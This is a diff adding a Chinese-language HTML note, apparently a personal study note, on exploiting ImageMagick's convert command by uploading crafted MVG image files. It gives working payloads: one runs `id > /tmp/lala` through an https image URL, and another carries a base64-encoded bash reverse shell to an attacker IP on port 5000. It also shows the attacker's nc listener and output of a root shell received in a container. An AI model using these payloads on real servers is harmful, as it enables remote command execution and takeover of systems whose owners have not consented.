@@ -1,0 +1,31 @@
+<p>上传一个文件，内容为：</p>
+<p>push graphic-context<br />viewbox 0 0 640 480 <br />image over 0,0 0,0 'https://baji.sweetysoft.com:3000/hi?x=`id &gt; /tmp/lala`'&#160; &#160;&#160;<br />pop graphic-context</p>
+<h1>0x00 任意命令执行</h1>
+<p>一旦服务器端执行 convert 命令，就会触发上面的&#160; https ...&#160;</p>
+<p>注意：</p>
+<p>1. 这里的触发https, 必须是这个协议，不能是http</p>
+<p>2. 并不会发起精确的 request url 到 ...:3000/hi 这里，而是被转换成了一个奇怪的URL，例如</p>
+<pre>[2020-11-15 08:50:08] ERROR bad Request-Line `\x16\x03\x01\x02\x00\x01\x00\x01�\x03\x03���zV\x17/�f�H�N�WEc�\x10���ﴚ�{�vmi&gt;\x00\x00��0�,�(�$�\x14�'.
+59.110.225.79 - - [15/Nov/2020:08:50:08 CST] "\x16\x03\x01\x02\x00\x01\x00\x01�\x03\x03���zV\x17/�f�H�N�WEc�\x10���ﴚ�{�vmi&gt;\x00\x00��0�,�(�$�\x14�" 400 335
+- -&gt;
+</pre>
+<p>3. 但是后面的&#160; id &gt; /tmp/lala&#160; 一定会执行，会在 /tmp/lala 目录下写入内容。</p>
+<h1>0x01&#160; 反向SHELL</h1>
+<p>上传一个文件，内容为：&#160;</p>
+<pre>push graphic-context
+viewbox 0 0 640 480
+image copy 200,200 100,100 "|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4yMTEuMjQ3LzUwMDAgMD4mMQo= | base64 -d | bash"
+pop graphic-context</pre>
+<p>(上述内容，由 base64 转换而来。具体见 笔记 ( base 64 转换）</p>
+<p>$ echo "/bin/bash -i &gt;&amp; /dev/tcp/172.17.211.247/5000 0&gt;&amp;1" | base64</p>
+<p>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4yMTEuMjQ3LzUwMDAgMD4mMQo=</p>
+<p>)
+</p>
+<p>同时，在 attacker 服务器上，开启&#160;</p>
+<p>nc -nvlp 5000</p>
+<p>上传文件后， attcker 服务器就可以看到有shell了。</p>
+<pre>root@baji:~# nc -nvlp 5000
+Listening on 0.0.0.0 5000
+Connection received on 172.19.0.2 39828
+root@8798d14e19fe:/var/www/html#
+</pre>
